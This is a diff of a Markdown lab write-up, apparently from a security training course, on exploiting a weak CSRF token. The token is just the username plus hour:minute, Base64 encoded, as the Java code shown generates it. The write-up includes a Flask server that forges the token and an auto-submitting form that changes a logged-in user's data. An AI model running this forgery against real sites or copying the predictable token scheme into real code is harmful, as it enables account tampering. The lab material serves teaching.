@@ -29,47 +29,51 @@ username : admin
 password: admin
 ```
 
-![](../../.gitbook/assets/java/CSRF-weak/1.png)
+![](../../.gitbook/assets/java/CSRF-Weak/1.png)
 
 When we are loggedin to the application we can see that we can set our favorite color and this will be stored in the session of the user.
 
-![](../../.gitbook/assets/java/CSRF-weak/2.png)
+![](../../.gitbook/assets/java/CSRF-Weak/2.png)
 
 If we inspect the request with an intercepting proxy we can see that the application is performing a POST request that results in a data mutation, storing our favorite color into the session of the user and displaying this back to the user in the HTML website.
 
-![](../../.gitbook/assets/java/CSRF-weak/3.png)
+![](../../.gitbook/assets/java/CSRF-Weak/3.png)
 
 Also we can see that the application is using a csrf_token
 
 ```html
-    <form method="post" action="/update">
-        <input type="hidden" class="form-control" name="csrf_token" value="<%=csrf_token %>">
-        <input type="text" class="form-control" name="color" placeholder="favorite color"/><br/>
-        <button class="btn btn-primary" type="submit">Submit Button</button></div>
-    </form>
+<form method="post" action="/update">
+  <input
+    type="hidden"
+    class="form-control"
+    name="csrf_token"
+    th:value="${csrfToken}"
+  /><br />
+  <input
+    type="text"
+    class="form-control"
+    name="color"
+    placeholder="favorite color"
+  /><br />
+  <button class="btn btn-primary" type="submit">Submit Button</button>
+</form>
 ```
 
 Looks like it's Base64 encoded, try decode it.
 
-![](../../.gitbook/assets/java/CSRF-weak/4.png)
+![](../../.gitbook/assets/java/CSRF-Weak/4.png)
 
 The csrf token is simply username + time.
 
 Checking the application code we can how this csrf_token is being implemented.
 
-```javascript
-  const username = req.body.username;
-  const password = req.body.password;
-  const sql = "SELECT * FROM users WHERE username = ? AND password = ?";
-  db.get(sql, [username, password], (err, row) => {
-    if (row) {
-      const date = new Date();
-      const time = date.getHours() + ":" + date.getMinutes();
-      let csrf_token = username + time;
-      session = req.session;
-      session.userId = row.UserId;
-      session.loggedIn = true;
-      session.csrf_token = Buffer.from(csrf_token).toString("base64");
+```java
+public String newCsrfToken(HttpServletRequest request){
+        String csrfToken =  request.getSession().getAttribute("username") + String.valueOf(LocalDateTime.now().getHour()) +":"+ String.valueOf(LocalDateTime.now().getMinute());
+        csrfToken = Base64.getEncoder().encodeToString(csrfToken.getBytes());
+        request.getSession().setAttribute("csrfToken",csrfToken);
+        return csrfToken;
+      }
 ```
 
 ## Exploitation
@@ -78,7 +82,7 @@ In order to to exploit this vulnerability we need to set up our evil webserver t
 
 ```python
 import base64
-from time import gmtime, strftime
+from time import localtime, strftime
 from flask import Flask, request, url_for, render_template, redirect, make_response
 
 app = Flask(__name__, static_url_path='/static', static_folder='static')
@@ -87,7 +91,7 @@ app.config['DEBUG'] = True
 
 @app.route("/")
 def start():
-    time = strftime("%H:%M", gmtime())
+    time = strftime("%H:%M", localtime())
     csrf = "admin" + time
     csrf_raw = base64.b64encode(csrf.encode())
     csrf_token = str(csrf_raw, 'utf-8')
@@ -115,8 +119,12 @@ Now that the service is running we want to serve the malicious piece of javascri
   target="csrf-frame"
   id="csrf-form"
 >
-  <input type="hidden" name="csrf_token" value="<%= csrf_token %>" />
   <input type="hidden" name="color" value="Hackzord!" />
+  <input
+    type="hidden"
+    name="csrf_token"
+    value="{% autoescape true %}{{csrf_token}}{% endautoescape %}"
+  />
   <input type="submit" value="submit" />
 </form>
 <script>
@@ -138,11 +146,11 @@ http://localhost:1337/
 
 This will now create a POST request to the application and changing the value of blue to the new value of 'Hackzord!' As you can see the Referer is set to our evil website where the request originated from and we have our forged csrf_token with the request.
 
-![](../../.gitbook/assets/java/CSRF-weak/5.png)
+![](../../.gitbook/assets/java/CSRF-Weak/5.png)
 
 Also when we refresh the original page of the application we can see that the new vaulue has been replaced with the content of our evil app.
 
-![](../../.gitbook/assets/java/CSRF-weak/6.png)
+![](../../.gitbook/assets/java/CSRF-Weak/6.png)
 
 ## Additional sources
 
